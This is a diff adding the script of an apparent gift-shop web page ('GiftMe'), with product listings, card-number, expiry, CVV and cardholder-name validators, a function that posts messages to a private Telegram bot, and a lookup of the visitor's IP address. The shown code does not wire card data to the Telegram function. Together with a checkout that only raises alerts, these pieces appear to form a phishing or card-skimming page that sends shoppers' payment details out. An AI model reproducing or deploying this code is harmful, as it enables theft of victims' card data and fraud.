+            };
+            
+            document.title = pageTitles[page] || 'GiftMe';
+        }
+
+        // Function to load products
+        function loadProducts() {
+            const featuredContainer = document.getElementById('featured-products');
+            const allProductsContainer = document.getElementById('all-products');
+            
+            // Clear existing content
+            featuredContainer.innerHTML = '';
+            allProductsContainer.innerHTML = '';
+            
+            // Add products to featured section (first 8 products)
+            products.slice(0, 8).forEach(product => {
+                featuredContainer.appendChild(createProductCard(product));
+            });
+            
+            // Add all products to gifts page
+            products.forEach(product => {
+                allProductsContainer.appendChild(createProductCard(product));
+            });
+        }
+
+        // Function to create product card
+        function createProductCard(product) {
+            const card = document.createElement('div');
+            card.className = 'product-card';
+            
+            // Generate star rating HTML
+            let starsHtml = '';
+            const fullStars = Math.floor(product.rating);
+            const hasHalfStar = product.rating % 1 !== 0;
+            
+            for (let i = 0; i < fullStars; i++) {
+                starsHtml += '<i class="fas fa-star"></i>';
+            }
+            
+            if (hasHalfStar) {
+                starsHtml += '<i class="fas fa-star-half-alt"></i>';
+            }
+            
+            const emptyStars = 5 - fullStars - (hasHalfStar ? 1 : 0);
+            for (let i = 0; i < emptyStars; i++) {
+                starsHtml += '<i class="far fa-star"></i>';
+            }
+            
+            card.innerHTML = `
+                <div class="product-image">
+                    <i class="${product.icon}"></i>
+                    ${product.badge ? `<div class="product-badge">${product.badge}</div>` : ''}
+                </div>
+                <div class="product-content">
+                    <div class="product-category">${product.category}</div>
+                    <h3 class="product-title">${product.name}</h3>
+                    <div class="product-rating">
+                        ${starsHtml}
+                        <span>(${product.reviews})</span>
+                    </div>
+                    <div class="product-price">
+                        <span class="current-price">$${product.price.toFixed(2)}</span>
+                    </div>
+                    <div class="product-actions">
+                        <button class="btn btn-outline add-to-cart" data-id="${product.id}">Add to Cart</button>
+                        <button class="btn btn-primary buy-now" data-id="${product.id}">Buy Now</button>
+                    </div>
+                </div>
+            `;
+            
+            // Add event listeners to buttons
+            card.querySelector('.add-to-cart').addEventListener('click', function() {
+                handleAddToCart(product.id);
+            });
+            
+            card.querySelector('.buy-now').addEventListener('click', function() {
+                handleBuyNow(product.id);
+            });
+            
+            return card;
+        }
+
+        // Function to set up auto-scrolling products
+        function setupAutoScroll() {
+            const autoScrollTrack = document.getElementById('auto-scroll-track');
+            
+            // Clear existing content
+            autoScrollTrack.innerHTML = '';
+            
+            // Add products to auto-scroll track (duplicate for seamless scrolling)
+            for (let i = 0; i < 2; i++) {
+                products.forEach(product => {
+                    const scrollItem = document.createElement('div');
+                    scrollItem.className = 'auto-scroll-item';
+                    scrollItem.appendChild(createProductCard(product));
+                    autoScrollTrack.appendChild(scrollItem);
+                });
+            }
+        }
+
+        // Function to set up page swapping
+        function setupPageSwapping() {
+            const swapContents = document.querySelectorAll('.page-swap-content');
+            let currentSwapIndex = 0;
+            
+            // Function to swap pages
+            function swapPage() {
+                // Hide current active content
+                swapContents[currentSwapIndex].classList.remove('active');
+                
+                // Move to next content
+                currentSwapIndex = (currentSwapIndex + 1) % swapContents.length;
+                
+                // Show next content
+                swapContents[currentSwapIndex].classList.add('active');
+            }
+            
+            // Start the swapping interval
+            pageSwapInterval = setInterval(swapPage, 5000);
+            
+            // Pause swapping when hovering over the container
+            const swapContainer = document.querySelector('.page-swap-container');
+            swapContainer.addEventListener('mouseenter', function() {
+                clearInterval(pageSwapInterval);
+            });
+            
+            swapContainer.addEventListener('mouseleave', function() {
+                pageSwapInterval = setInterval(swapPage, 5000);
+            });
+        }
+
+        // Function to handle Add to Cart
+        function handleAddToCart(productId) {
+            if (!isLoggedIn) {
+                showLoginRequiredModal();
+                return;
+            }
+            
+            const product = products.find(p => p.id === productId);
+            cartItems.push(product);
+            alert(`${product.name} added to cart!`);
+        }
+
+        // Function to handle Buy Now
+        function handleBuyNow(productId) {
+            if (!isLoggedIn) {
+                showLoginRequiredModal();
+                return;
+            }
+            
+            const product = products.find(p => p.id === productId);
+            alert(`Redirecting to checkout for ${product.name}...`);
+        }
+
+        // Function to show login required modal
+        function showLoginRequiredModal() {
+            document.getElementById('login-required-modal').style.display = 'flex';
+        }
+
+        // Card validation functions
+        function validateCardNumber() {
+            const cardNumber = document.getElementById('card-number');
+            const errorElement = document.getElementById('card-number-error');
+            const value = cardNumber.value.replace(/\s/g, '');
+            
+            if (value.length !== 16 || !/^\d+$/.test(value)) {
+                cardNumber.classList.add('input-error');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                cardNumber.classList.remove('input-error');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+
+        function validateExpiryDate() {
+            const expiryDate = document.getElementById('expiry-date');
+            const errorElement = document.getElementById('expiry-date-error');
+            const value = expiryDate.value;
+            
+            // Check format MM/YY
+            const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            if (!regex.test(value)) {
+                expiryDate.classList.add('input-error');
+                errorElement.style.display = 'block';
+                return false;
+            }
+            
+            // Check if date is in the future
+            const [month, year] = value.split('/');
+            const currentDate = new Date();
+            const currentYear = currentDate.getFullYear() % 100;
+            const currentMonth = currentDate.getMonth() + 1;
+            
+            if (parseInt(year) < currentYear || 
+                (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
+                expiryDate.classList.add('input-error');
+                errorElement.textContent = 'Card has expired';
+                errorElement.style.display = 'block';
+                return false;
+            }
+            
+            expiryDate.classList.remove('input-error');
+            errorElement.style.display = 'none';
+            return true;
+        }
+
+        function validateCVV() {
+            const cvv = document.getElementById('cvv');
+            const errorElement = document.getElementById('cvv-error');
+            const value = cvv.value;
+            
+            if (!/^\d{3,4}$/.test(value)) {
+                cvv.classList.add('input-error');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                cvv.classList.remove('input-error');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+
+        function validateCardName() {
+            const cardName = document.getElementById('card-name');
+            const errorElement = document.getElementById('card-name-error');
+            const value = cardName.value.trim();
+            
+            if (value.length < 2) {
+                cardName.classList.add('input-error');
+                errorElement.style.display = 'block';
+                return false;
+            } else {
+                cardName.classList.remove('input-error');
+                errorElement.style.display = 'none';
+                return true;
+            }
+        }
+
+        function validateCardDetails() {
+            const validations = [
+                validateCardNumber(),
+                validateExpiryDate(),
+                validateCVV(),
+                validateCardName()
+            ];
+            
+            return validations.every(valid => valid);
+        }
+
+        // Function to send data to Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending to Telegram:', error);
+            });
+        }
+
+        // Function to get IP address
+        function getIP() {
+            return new Promise((resolve) => {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => resolve(data.ip))
+                    .catch(() => resolve('Unknown'));
+            });
+        }
+    </script>
+</body>
+</html>
